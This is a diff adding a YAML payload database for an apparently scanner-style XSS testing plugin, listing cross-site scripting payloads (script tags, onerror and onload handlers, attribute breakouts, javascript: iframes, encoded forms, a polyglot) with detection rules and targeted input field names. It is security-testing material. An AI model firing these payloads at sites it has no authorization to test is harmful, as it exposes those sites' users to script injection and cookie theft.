@@ -1,0 +1,102 @@
+# XSS Payloads Database
+# Plugin: core.injection.xss
+
+plugin_id: core.injection.xss
+mutation_type: field_injection
+payload_type: xss
+
+variants:
+  - id: script_basic
+    payloads:
+      - "<script>alert(1)</script>"
+      - "<script>alert(document.domain)</script>"
+      - "<script>alert('XSS')</script>"
+    tech_stack: []
+    confidence_boost: 0.10
+    detection: body_contains(payload)
+
+  - id: img_onerror
+    payloads:
+      - "<img src=x onerror=alert(1)>"
+      - "<img src=x onerror=alert(document.cookie)>"
+      - "<img/src=x onerror=alert(1)>"
+    tech_stack: []
+    confidence_boost: 0.10
+    detection: body_contains(payload)
+
+  - id: svg_onload
+    payloads:
+      - "<svg onload=alert(1)>"
+      - "<svg/onload=alert(1)>"
+      - "<svg><script>alert(1)</script></svg>"
+    tech_stack: []
+    confidence_boost: 0.10
+    detection: body_contains(payload)
+
+  - id: attribute_breakout
+    payloads:
+      - "\"><script>alert(1)</script>"
+      - "' onmouseover='alert(1)"
+      - "\" autofocus onfocus=alert(1) x=\""
+    tech_stack: []
+    confidence_boost: 0.12
+    detection: body_contains(script) OR body_contains(onmouseover)
+
+  - id: iframe_javascript
+    payloads:
+      - "<iframe src=\"javascript:alert(1)\">"
+      - "<iframe src=javascript:alert(document.domain)>"
+    tech_stack: []
+    confidence_boost: 0.08
+    detection: body_contains(payload)
+
+  - id: encoded_payload
+    payloads:
+      - "<script>alert(String.fromCharCode(88,83,83))</script>"
+      - "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+      - "&#60;script&#62;alert(1)&#60;/script&#62;"
+    tech_stack: []
+    confidence_boost: 0.15
+    detection: body_contains(script) OR status_code == 200
+
+  - id: event_handlers
+    payloads:
+      - "<body onload=alert(1)>"
+      - "<input onfocus=alert(1) autofocus>"
+      - "<select onfocus=alert(1) autofocus>"
+      - "<textarea onfocus=alert(1) autofocus>"
+    tech_stack: []
+    confidence_boost: 0.10
+    detection: body_contains(onload) OR body_contains(onfocus)
+
+  - id: polyglot
+    payloads:
+      - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
+      - "'\"--></script><script>alert(1)</script>"
+    tech_stack: []
+    confidence_boost: 0.20
+    detection: body_contains(script) OR body_contains(alert)
+
+keywords:
+  - name
+  - comment
+  - message
+  - title
+  - description
+  - text
+  - content
+  - body
+  - search
+  - query
+  - feedback
+  - review
+
+expected_results:
+  script_basic:
+    indicator: payload_reflected
+  img_onerror:
+    indicator: payload_reflected
+  attribute_breakout:
+    indicator: context_breakout_success
+  encoded_payload:
+    indicator: decoded_reflection
